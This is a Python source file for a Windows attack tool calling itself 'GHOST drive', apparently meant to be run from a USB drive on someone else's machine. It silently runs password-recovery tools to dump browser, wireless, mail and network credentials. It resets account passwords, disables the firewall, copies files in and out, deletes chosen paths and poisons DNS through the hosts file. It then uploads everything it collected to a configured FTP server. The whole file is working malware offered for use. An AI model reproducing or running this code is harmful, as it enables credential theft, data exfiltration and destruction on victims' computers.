import os, sys, ctypes, socket, subprocess, math, wmi, platform, datetime, time, requests, ftplib, winsound
exec(open("config.py").read())

cwd = os.getcwd()

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

# setting up directory
usr = os.environ['username']
if not os.path.exists("hosts/" + usr):
    os.makedirs("hosts/" + usr)
    root = usr
elif duplicate_exec:
    usr_x = 1
    usr_ct = 2
    while usr_x:
        usr_ct = str(usr_ct)
        if not os.path.exists("hosts/"+ usr + " (" + usr_ct + ")"):
            os.makedirs("hosts/" + usr + " (" + usr_ct + ")")
            root = usr + " (" + usr_ct + ")"
            usr_x = 0
        else:
            usr_ct = int(usr_ct)
            usr_ct += 1
else:
    sys.exit()
rootdir = "..\\hosts\\" + root + "\\"
log_error = ""

# logging start
if logging:
    d = datetime.datetime.now()
    start_time = time.time()


# checking internet connectivity
try:
    socket.create_connection(("www.google.com", 80))
    inet = 1
except OSError:
    pass
    inet = 0

# ftp init
if ftp["controller"]:
    if inet:
        iftp = ftplib.FTP()
        iftp.connect(ftp["host"], ftp["port"])
        iftp.login(ftp["username"], ftp["password"])
        iftp.cwd(ftp["dir"])
        def ftpGo(path):
            files = os.listdir(path)
            os.chdir(path)
            iftp.mkd(root)
            iftp.cwd(root)
            for f in files:
                if os.path.isfile(f):
                    fh = open(f, 'rb')
                    iftp.storbinary('STOR %s' % f, fh)
                    fh.close()
                elif os.path.isdir(f):
                    iftp.mkd(f)
                    iftp.cwd(f)
                    ftpGo(f)
            iftp.cwd('..')
            os.chdir('..')
    else:
        log_error += "\n[ftp] -> Internet connection failed"

os.chdir("payloads")
# password recovery
if browser_pwds:
    p = rootdir + "Browser passwords.html"
    subprocess.call(["WebBrowserPassView.exe", "/shtml", p], startupinfo=si)
if wireless_keys:
    p = rootdir + "Wireless passwords.html"
    subprocess.call(["WirelesskeyView.exe", "/shtml", p], startupinfo=si)
if email_pst_pwds:
    p = rootdir + "Email pst passwords.html"
    subprocess.call(["PstPassword.exe", "/shtml", p], startupinfo=si)
if mail_pwds:
    p = rootdir + "Mail passwords.html"
    subprocess.call(["mailpv.exe", "/shtml", p], startupinfo=si)
if network_pwds:
    p = rootdir + "Network passwords.html"
    subprocess.call(["netpass.exe", "/shtml", p], startupinfo=si)
if msn_pwds:
    p = rootdir + "MSN passwords.html"
    subprocess.call(["mspass.exe", "/shtml", p], startupinfo=si)
if dialup_pwds:
    p = rootdir + "Dialup passwords.html"
    subprocess.call(["Dialupass.exe" ,"/shtml", p], startupinfo=si)

# changing nt password
if change_nt_pwd["current_acc_controller"]:
    xpwd = change_nt_pwd["current_acc_pwd"]
    subprocess.call("cmd /c net user "+'"'+"%username%"+'" '+'"'+xpwd+'"', startupinfo=si)
if change_nt_pwd["diff_acc_controller"]:
    xusr = change_nt_pwd["diff_acc_usr"]
    xpwd = change_nt_pwd["diff_acc_pwd"]
    subprocess.call("cmd /c net user "+'"'+xusr+'" '+'"'+xpwd+'"', startupinfo=si)

# Network based executions
if disable_firewall:
    subprocess.call("netsh advfirewall set allprofiles state off", startupinfo=si)
if enable_firewall:
    subprocess.call("netsh advfirewall set allprofiles state on", startupinfo=si)
if release_net_adapters:
    subprocess.call("ipconfig /release", startupinfo=si)
if renew_net_adapters:
    subprocess.call("ipconfig /renew", startupinfo=si)
if flush_dns:
    subprocess.call("ipconfig /flushdns", startupinfo=si)
if register_dns:
    subprocess.call("ipconfig /registerdns", startupinfo=si)

# recon
if network_scan and inet:
    p = rootdir + "Network scan.html"
    subprocess.call(["WNetWatcher.exe", "/shtml", p], startupinfo=si)

if batch_recon:
    if inet:
        ext_ip = requests.get("https://myexternalip.com/raw")
        ip = str(ext_ip.text)
    inet = str(inet)
    if inet:
        br_inet = "online"
        br_ip = ip
    else:
        br_inet = "offline"
        br_ip = "N/A"
    subprocess.call(["br.bat", root, rootdir, br_inet, br_ip], startupinfo=si)
if sysinfo:
    c = wmi.WMI()    
    sysinfo = c.Win32_ComputerSystem()[0]
    osinfo = c.Win32_OperatingSystem()[0]
    cpuinfo = c.Win32_Processor()[0]
    hddinfo = c.Win32_LogicalDisk()[0]
    raminfo = c.Win32_PhysicalMemory()[0]

    manufacturer = sysinfo.Manufacturer
    model = sysinfo.Model
    ramtotal = int(sysinfo.TotalPhysicalMemory)
    hddtotal = int(hddinfo.size)
    ramsize = round(ramtotal / 1024 / 1024 / 1024)
    hddsize = round(hddtotal / 1024 / 1024 / 1024)
    fh = open(rootdir+"System information.txt", "w")
    fh.write("Primary recon:\n===============================\n\n")
    fh.write("Model: " + manufacturer + " " + model+"\n")
    fh.write("HDD: " + str(hddsize) + " GB"+"\n")
    fh.write("RAM: " + str(ramsize) + " GB"+"\n")
    fh.write("CPU: " + cpuinfo.name+"\n")
    fh.write("OS: " + osinfo.caption+"\n")
    fh.write("\nPlatform recon:\n===============================\n\n")
    fh.write("Machine: " + platform.machine()+"\n")
    fh.write("Hostname: " + platform.node()+"\n")
    fh.write("Platform: " + platform.platform()+"\n")
    fh.write("Processor: " + platform.processor()+"\n")
    fh.write("Release: " + platform.release()+"\n")
    fh.write("Version: " + platform.version()+"\n")
    fh.write("System: " + platform.system()+"\n")
    fh.write("System alias: " + str(platform.system_alias(platform.system(), platform.release(), platform.version()))+"\n")
    fh.write("Uname: " + str(platform.uname())+"\n")
    fh.close()

# target execution
if target_exec['controller']:
    if os.path.exists(target_exec['path']):
        if os.path.isdir(target_exec['path']):
            for x in os.listdir(target_exec['path']):
                os.chdir(target_exec['path'])
                os.startfile(x)
        else:
            os.startfile(target_exec['path'])
    else:
        log_error += "\n[target_exec] -> path is invalid"

# local execution
if local_exec:
    os.chdir(cwd)
    os.chdir('ext/bin_exec')
    for x in os.listdir():
        os.startfile(x)

os.chdir("../")
# injector
if injector["controller"]:
    ipath = injector["path"]
    if not injector["var_case"]:
        if ipath is "":
            log_error += "\n[injector] -> path is not defined"
        elif not os.path.exists(ipath):
            log_error += "\n[injector] -> path is invalid"
        else:
            if not os.path.isdir(ipath):
                    log_error += "\n[injector] -> path must be a directory not a file"
            else:
                subprocess.call("cmd /c robocopy bin_inject "+'"'+ipath+'"'+" /s /e", startupinfo=si)
    else:
        subprocess.call("cmd /c robocopy bin_inject "+"\""+ipath+"\""+" /s /e", startupinfo=si)

# retriever

if retriever["controller"]:
    rpath = retriever["path"]
    if not retriever["var_case"]:
        if rpath is "":
            log_error += "\n[retriever] -> path is not defined"
        elif not os.path.exists(rpath):
            log_error += "\n[retriever] -> path is invalid"
        else:
            if os.path.isdir(rpath):
                subprocess.call("cmd /c robocopy "+"\""+rpath+"\""+" bin_retrieve /s /e", startupinfo=si)
            else:
                subprocess.call("cmd /c copy "+"\""+rpath+"\""+" bin_retrieve", startupinfo=si) 
    else:
        if injector["var_case_dir"]:
            subprocess.call("cmd /c robocopy "+"\""+rpath+"\""+" bin_retrieve /s /e", startupinfo=si)
        else:
            subprocess.call("cmd /c copy "+"\""+rpath+"\""+" bin_retrieve", startupinfo=si)

# destroyer
if destroyer["controller"]:
    dpath = destroyer["path"]
    if not injector["var_case"]:
        if dpath is "":
            log_error += "\n[destroyer] -> path is not defined"
        elif not os.path.exists(dpath):
            log_error += "\n[destroyer] -> path is invalid"
        else:
            if os.path.isdir(dpath):
                subprocess.call("cmd /c rd /s /q "+"\""+dpath+"\"", startupinfo=si)
            else:
                subprocess.call("cmd /c del "+ "\"" +dpath+"\"", startupinfo=si)
    else:
        if injector["var_case_dir"]:
            subprocess.call("cmd /c rd /s /q "+"\""+dpath+"\"", startupinfo=si)
        else:
            subprocess.call("cmd /c del "+ "\"" +dpath+"\"", startupinfo=si)

# dns halter
if dns_halt["controller"]:
    os.chdir(os.environ['WINDIR'] + "\\System32\\drivers\\etc\\")
    if dns_halt["clear"]:
        open('hosts', 'w')
    if dns_halt['entries'] is not "":
        for x in dns_halt['entries'].split(', '):
            f = open('hosts', 'a')
            f.write("\n127.0.0.1 "+x)
        f.close()

# dns poisoner
if dns_poison['controller']:
    os.chdir(os.environ['WINDIR'] + "\\System32\\drivers\\etc\\")
    if dns_poison['clear']:
        open('hosts', 'w')
    if dns_poison['entries'] is not "":
        for x in dns_poison['entries'].split(', '):
            f = open('hosts', 'a')
            f.write("\n"+x)
        f.close()

# logging end
if logging:
    os.chdir(cwd+"/payloads")
    fl = open(rootdir+"Log.txt", "w")
    d2 = datetime.datetime.now()
    end_time = time.time()
    et = end_time - start_time
    et = round(et)
    if et > 1:
        elapsed_time = str(et) + " seconds"
    elif et is 0:
        elapsed_time = str(et) + " seconds"
    else:
        elapsed_time = str(et) + " second"
    logstart1 = d.strftime(r"%d-%m-%Y -> %A, %d/%B/%Y")
    logstart2 = d.strftime(r"%I:%M:%S %p")
    logend1 = d2.strftime(r"%d-%m-%Y -> %A, %d/%B/%Y")
    logend2 = d2.strftime(r"%I:%M:%S %p")
    fl.write("GHOST drive logs\n----------------\n\n")
    fl.write("Started on:\n===================================\n"+"Date: "+logstart1+"\nTime: "+logstart2)
    fl.write("\n\n\nFinished on:\n===================================\n"+"Date: "+logend1+"\nTime: "+logend2)
    fl.write("\n\nElapsed time: "+elapsed_time)
    fl.write("\n\nErrors:\n===================================")
    if log_error is "":
        log_error += "\n[+] None"
    fl.write(log_error)
    fl.close()

# ftp Go
if ftp["controller"] and inet:
    ftpGo(rootdir)
    iftp.close()

if sound:
    winsound.PlaySound("*", winsound.SND_ALIAS)

# msg box
if msgbox["controller"]:
    ctypes.windll.user32.MessageBoxW(0, msgbox["msg"], msgbox["title"], msgbox["buttons"])

# shutdown code
if power["controller"]:
    if power["mode"] != "":
        shutdown = "shutdown -" + power['mode']
        if power["comment"] != "":
            shutdown = shutdown + " -c " + "\"" + power['comment'] + "\""
        if power["timeout"] != "":
                shutdown = shutdown + " -t " + power['timeout']
        subprocess.call(shutdown, startupinfo=si)